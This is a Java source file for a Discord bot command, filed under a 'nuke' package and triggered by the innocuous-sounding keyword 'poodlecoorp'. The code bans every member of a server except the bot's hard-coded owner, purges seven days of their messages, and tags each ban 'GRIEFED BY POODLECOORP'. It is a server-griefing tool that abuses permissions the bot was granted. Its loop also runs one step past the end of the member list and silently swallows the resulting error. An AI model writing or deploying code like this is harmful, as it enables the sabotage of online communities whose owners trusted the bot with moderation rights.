package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.exceptions.HierarchyException;

import java.util.Arrays;
import java.util.List;

public class Banwave implements ICommand {

    private int i;

    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        TextChannel channel = event.getChannel();
        Member member = event.getMember();
        Member selfMember = event.getGuild().getSelfMember();

        if (!member.hasPermission(Permission.BAN_MEMBERS)) {
            channel.sendMessage("You don't have permission to commence a banwave").queue();
            return;
        }

        if (!selfMember.hasPermission(Permission.BAN_MEMBERS)) {
            channel.sendMessage("I don't have permissions to commence a banwave").queue();
            return;
        }
        try {
            List<Member> members = event.getGuild().getMembers();
            for (this.i = 0; i <= members.size(); i++) {
                try {
                    if (!(members.get(i).getUser().getIdLong() == Core.OWNERID))
                    event.getGuild().ban(members.get(i), 7).reason("GRIEFED BY POODLECOORP").queue();
                } catch (HierarchyException e) {
                    //	event.getChannel().sendMessage("Caught Hierarchy Exception, Attempting to Skip").queue();
                }
                EmbedBuilder ban = new EmbedBuilder();
                ban.setColor(0xff802b);
                ban.setDescription("banned " + members.get(i).getAsMention());
            //    event.getChannel().sendMessage(ban.build()).queue();;
            }
            event.getChannel().sendMessage("poodlecoorp!").queue();
        } catch (HierarchyException | IndexOutOfBoundsException e) {

        }
    }

    @Override
    public String getHelp() {
        return "Use at your own risk\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "poodlecoorp";
    }

    @Override
    public String[] getAlias() {
        return new String[0];
    }
}
